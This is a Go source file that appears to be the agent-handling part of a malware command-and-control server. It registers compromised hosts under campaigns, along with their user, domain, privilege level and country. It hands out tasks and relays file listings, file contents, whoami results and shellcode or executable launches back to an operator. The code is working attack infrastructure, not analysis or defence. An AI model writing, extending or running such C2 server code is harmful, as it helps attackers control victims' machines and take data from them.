package server

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/go-chi/chi/v5"

	"ldrserver/internal/database"
	"ldrserver/internal/parser"
	"ldrserver/internal/utils"
	"ldrserver/internal/ws"
)

func (s *Server) HandleAgentCheckin(w http.ResponseWriter, r *http.Request) {
	defer r.Body.Close()

	body, err := io.ReadAll(r.Body)
	if err != nil {
		utils.Return400(w, "failed reading request body")
		return
	}

	reader := parser.NewReader(bytes.NewReader(body))
	code := reader.Read4()
	if reader.Err() != nil {
		utils.Return400(w, "failed parsing request")
		return
	}

	switch code {
	case CODE_CHECK_IN:
		agentID := reader.ReadString()
		if reader.Err() != nil {
			utils.Return400(w, "failed parsing request")
			return
		}
		fmt.Printf("[+] Agent Checked in %s\n", agentID)
		tasks, err := s.DB.GetTasks(agentID)
		if err != nil {
			utils.Return500(w, "failed getting tasks")
			return
		}
		if tasks == nil {
			pw := parser.NewWriter()
			pw.Write4(TASK_NO_TASK)
			fmt.Println("[*] Sending back no task")
			w.Header().Set("Content-Type", "application/octet-stream")
			w.Write(pw.Bytes())
			return
		} else {
			pw := parser.NewWriter()
			data, err := pw.WriteTasks(tasks)
			if err != nil {
				utils.Return500(w, "failed serializing tasks")
				return
			}
			w.Header().Set("Content-Type", "application/octet-stream")
			w.Write(data)
		}

	case CODE_REGISTER:
		agentID := reader.ReadString()
		if reader.Err() != nil {
			utils.Return400(w, "failed parsing request")
			return
		}
		agent, err := reader.ParseRegister(agentID)
		if err != nil {
			w.WriteHeader(http.StatusServiceUnavailable)
			return
		}
		if err := s.DB.InsertAgent(agent); err != nil {
			w.WriteHeader(http.StatusServiceUnavailable)
			return
		}
		s.WS.Broadcast(ws.EventAgentNew, map[string]interface{}{
			"campaign_id": agent.CampaignID,
			"agent": database.Agent{
				UUID:     agent.AgentID,
				Username: agent.Username,
				Hostname: agent.Hostname,
				Domain:   agent.Domain,
				Arch:     agent.Arch,
				IsElev:   agent.IsElev,
				Country:  agent.Country,
				LastSeen: time.Now().UTC().Format("2006-01-02 15:04:05"),
			},
		})
		w.WriteHeader(http.StatusOK)
		return

	case MSG_OUTPUT:
		agentID := reader.ReadString()
		campaignID := reader.ReadString()
		taskID := reader.Read4()
		outputType := reader.Read4()
		payload := reader.ReadRest()
		if reader.Err() != nil {
			utils.Return400(w, "failed parsing output")
			return
		}

		if taskID != 0 {
			if err := s.DB.MarkTaskAsDone(int(taskID)); err != nil {
				fmt.Printf("[!] failed marking task %d done: %v\n", taskID, err)
			}
		}

		var output string
		switch outputType {
		case OUTPUT_NO_DATA:
			// Task launched with no payload (EXE/DLL/shellcode). It's already
			// marked done above; just tell the operator.
			s.WS.Broadcast(ws.EventAgentTaskDone, map[string]interface{}{
				"agent_id":    agentID,
				"campaign_id": campaignID,
				"task_id":     taskID,
			})
			w.WriteHeader(http.StatusOK)
			return
		case OUTPUT_LS:
			entries, err := parser.ParseLS(payload)
			if err != nil {
				output = "[ls parse error]"
			} else {
				output = parser.FormatLS(entries)
			}
		case OUTPUT_CAT:
			data, err := parser.ParseCat(payload)
			if err != nil {
				output = "[cat parse error]"
			} else {
				output = string(data)
			}
		case OUTPUT_WHOAMI:
			who, err := parser.ParseWhoami(payload)
			if err != nil {
				output = "[whoami parse error]"
			} else {
				output = parser.FormatWhoami(who)
			}
		default:
			output = string(payload)
		}

		s.WS.Broadcast(ws.EventAgentOutput, map[string]interface{}{
			"agent_id":    agentID,
			"campaign_id": campaignID,
			"task_id":     taskID,
			"type":        outputType,
			"output":      output,
		})
		w.WriteHeader(http.StatusOK)
		return

	default:
		return
	}
}

func (s *Server) GetAgentInfo(w http.ResponseWriter, r *http.Request) {
	campaignId := chi.URLParam(r, "id")
	agentId := chi.URLParam(r, "agentid")

	info, err := s.DB.GetSingleAgentInfo(campaignId, agentId)
	if err != nil {
		utils.Return500(w, "error retreiving agent info")
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(info)
}

func (s *Server) GetAgents(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	agents, err := s.DB.GetAgents(id)
	if err != nil {
		utils.Return500(w, "failed getting agents from db")
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(agents)
}

func (s *Server) DeleteAgent(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")
	if err := s.DB.DeleteAgent(id); err != nil {
		utils.Return500(w, "Failed Deleting Agent")
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"msg": "Succesfully deleted agent"})
	return
}
